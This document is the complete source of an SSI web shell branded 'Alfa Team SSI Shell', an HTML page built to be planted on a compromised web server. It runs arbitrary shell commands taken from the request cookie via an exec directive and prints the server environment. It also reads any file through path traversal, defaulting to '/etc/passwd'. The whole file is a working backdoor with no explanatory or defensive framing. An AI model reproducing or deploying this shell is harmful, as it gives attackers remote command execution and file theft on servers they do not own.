<!--#config errmsg="[Error]"--><!--#config sizefmt="bytes"--><!--#if expr="(\"$HTTP_COOKIE\" = \"\") || (\"$REQUEST_METHOD\" != \"GET\")" --><!--#set var="shl" value="ls -la" --><!--#else --><!--#set var="shl" value=$HTTP_COOKIE --><!--#endif --> <!--#if expr="(\"$HTTP_COOKIE\" = \"\") || (\"$REQUEST_METHOD\" != \"POST\")" --><!--#set var="inc" value="/../../../../../../../etc/passwd" --><!--#else --><!--#set var="inc" value=$HTTP_COOKIE --> <!--#endif --> <html><head><title>Alfa Team SSI Shell</title><script language="javascript">function doit( mode ) {if( document.cookie != "" ) {var cookies = document.cookie.split( ";" );for( var i = 0; i < cookies.length; ++i )document.cookie = cookies[ i ] + ";expires=Thu, 01 Jan 1970 00:00:00 GMT";}document.cookie = document.getElementById( mode ).value;document.location.reload();}function toggle( id ) { document.getElementById( id ).style.display = (document.getElementById( id ).style.display == "none") ? "block" : "none";}</script></head><body onload="document.getElementById('command').focus();" bgcolor="#000000" alink="blue" vlink="blue"><br><div><center><h3><font color="#59cc33">| Alfa Team SSI Shell |</font></h3></center><br><center><b><u><font size="+1" onclick="toggle('env');" style="cursor:pointer;color:red;">Enviroment info</font></u></b></center><div id="env" style="display:none;color:#67ABDF;"><br><pre><!--#printenv--></pre><br></div></div><br><div><center><b><u><font size="+1" onclick="toggle('shl');" style="cursor:pointer;color:red;">Command for shell</font></u></b></center></div><div align="center" width="100%" border="0" id="shl" style="background-color:#000000;<!--#if expr="\"$REQUEST_METHOD\" != \"GET\"" -->display:none;<!--#endif -->"><br><b><font color="#67ABDF">Enter command</font></b>:&nbsp;&nbsp;&nbsp;<form method="get" onsubmit="doit('command');"><input type="text" size="80" id="command">&nbsp;<input type="submit" value="Run"></form><br><center><b><font size="+1" color="#67ABDF">Result</font></b></center><br><textarea bgcolor="#e4e0d8" cols="121" rows="15"><!--#exec cmd=$shl --></textarea> </div> <div><br><center><b><u><font size="+1" onclick="toggle('inc');" style="cursor:pointer;color:red;">Operations on files</font></u></b></center><div id="inc" align="center" width="100%" border="0" style="background-color:#000000;<!--#if expr="\"$REQUEST_METHOD\" != \"POST\"" -->style=display:none;<!--#endif -->"><br><b><font color="#67ABDF">View file (virtual include):</font></b>&nbsp;&nbsp;&nbsp;<form method="post" onsubmit="doit('vfile');"><input type="text" size=80 id="vfile">&nbsp;<input type="submit" value="Run"></form><br><b><font color="#67ABDF">Size:</font></b>&nbsp;&nbsp;&nbsp;<b><font color="#67ABDF"><!--#fsize virtual=$inc -->&nbsp;bytes</font></b><br><textarea bgcolor="#e4e0d8" cols="121" rows="15"><!--#include virtual=$inc --></textarea><br></div></div></body></html>
